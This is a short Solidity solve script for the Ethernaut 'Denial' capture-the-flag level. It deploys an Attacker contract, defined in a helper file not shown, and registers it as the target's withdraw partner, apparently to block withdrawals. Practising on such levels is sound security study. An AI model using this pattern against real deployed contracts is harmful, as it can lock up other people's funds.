// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {CheckScript} from "./common/Check.sol";
import {SolveScript} from "./common/Solve.sol";
import {Denial} from "ethernaut/levels/Denial.sol";
import {Attacker} from "~/helpers/Denial.sol";

contract Check is CheckScript("DENIAL") {}

contract Solve is SolveScript("DENIAL") {
    Denial target;

    constructor() {
        target = Denial(instance);
    }

    function attack() public override {
        Attacker attacker = new Attacker();
        target.setWithdrawPartner(address(attacker));
    }
}
